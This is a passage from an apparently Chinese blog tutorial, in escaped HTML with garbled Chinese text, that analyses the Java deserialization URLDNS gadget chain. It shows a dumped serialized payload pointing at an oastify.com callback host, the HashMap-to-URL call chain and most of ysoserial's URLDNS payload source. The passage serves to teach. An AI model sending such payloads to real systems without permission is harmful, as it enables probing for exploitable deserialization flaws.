&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;âœ  java -jar SerializationDumper-v1.13.jar -r dns.ser
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;STREAM_MAGIC - 0xac ed
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;STREAM_VERSION - 0x00 05
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;....
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;....
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;....
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              superClassDesc
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                TC_NULL - 0x70
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            newHandle 0x00 7e 00 04
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            classdata
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              java.net.URL
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                values
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  hashCode
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    (int)1234 - 0x00 00 04 d2 //è¿™é‡Œå°±æ˜¯è®¾ç½®çš„æ•°å€¼
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  port
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    (int)-1 - 0xff ff ff ff
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  authority
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    (object)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                      TC_STRING - 0x74
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        newHandle 0x00 7e 00 05
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        Length - 42 - 0x00 2a
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        Value - 6qxyz8op2m5bp7jw5gf83vpgq7wxkm.oastify.com - 0x367178797a386f70326d356270376a773567663833767067713777786b6d2e6f6173746966792e636f6d
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                  file
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ€ä¹ˆæ‰èƒ½åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘è€Œåœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¸è§¦å‘å‘¢ï¼Ÿåœ¨åºåˆ—åŒ–çš„æ—¶å€™åŠ ä¸Šè¿™ä¸€å¥å³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;field&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‚£ä¹ˆæˆ‘ä»¬åºåˆ—åŒ–çš„æ•´æ®µä»£ç å°±å˜ä¸ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/13.png&#34; alt=&#34;13&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å†æ¬¡æ‰§è¡Œååºåˆ—åŒ–çš„æ—¶å€™å°±çœ‹åˆ°DNSè¯·æ±‚äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/14.png&#34; alt=&#34;14&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬debugä¸€ä¸‹ååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œå…ˆåœ¨HashMapä¸­é‡å†™readObjectæ–¹æ³•ä¸­ä¸‹æ–­ç‚¹ï¼Œæˆ‘ä»¬å¾€ä¸‹èµ°å¯ä»¥çœ‹åˆ°putValä¸­çš„hashæ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/15.png&#34; alt=&#34;15&#34;&gt;&lt;/p&gt;
&lt;p&gt;å†å¾€ä¸‹èµ°æ˜¯å¦ä¼¼æ›¾ç›¸è¯†å‘¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/16.png&#34; alt=&#34;16&#34;&gt;&lt;/p&gt;
&lt;p&gt;Keyæ˜¯URLå¯¹è±¡ï¼Œæ‰€ä»¥ä¼šè§¦å‘URLé‡Œé¢çš„hashCodeæ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/17.png&#34; alt=&#34;17&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç»§ç»­å¾€ä¸‹èµ°å°±è·Ÿæˆ‘ä»¬åºåˆ—åŒ–çš„æ˜¯ä¸€æ ·çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/18.png&#34; alt=&#34;18&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æ•´ä¸ªæµç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;putVal&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;hash&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;hashcode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;URLStreamHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;hashCode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getHostAddress&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;URLStreamHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;hashCode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getHostAddress&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getByName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ysoserialä¹‹urldnsåˆ†æ&#34;&gt;ysoserialä¹‹URLDNSåˆ†æ&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥çœ‹ä¸‹ysoserialä¸­çš„&lt;a href=&#34;https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java&#34;&gt;URLDNS.java&lt;/a&gt;æ˜¯æ€ä¹ˆå†™çš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;package&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;ysoserial.payloads&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.IOException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.net.InetAddress&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.net.URLConnection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.net.URLStreamHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.util.HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.net.URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;ysoserial.payloads.annotation.Authors&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;ysoserial.payloads.annotation.Dependencies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;ysoserial.payloads.annotation.PayloadTest&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;ysoserial.payloads.util.PayloadRunner&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;ysoserial.payloads.util.Reflections&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nd&#34;&gt;@SuppressWarnings&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;rawtypes&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;unchecked&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nd&#34;&gt;@PayloadTest&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;skip&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nd&#34;&gt;@Dependencies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nd&#34;&gt;@Authors&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Authors&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;GEBL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;URLDNS&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectPayload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;c1&#34;&gt;//Avoid DNS resolution during payload creation
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                &lt;span class=&#34;c1&#34;&gt;//Since the field &amp;lt;code&amp;gt;java.net.URL.handler&amp;lt;/code&amp;gt; is transient, it will not be part of the serialized payload.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                &lt;span class=&#34;n&#34;&gt;URLStreamHandler&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;handler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SilentURLStreamHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ht&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// HashMap that will contain the URL
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                &lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;handler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// URL to use as the Key
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                &lt;span class=&#34;n&#34;&gt;ht&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;Reflections&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setFieldValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;hashCode&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// During the put above, the URL&amp;#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ht&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;PayloadRunner&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;URLDNS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;SilentURLStreamHandler&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;URLStreamHandler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;kd&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;URLConnection&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;openConnection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IOException&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;kd&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;synchronized&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InetAddress&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getHostAddress&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
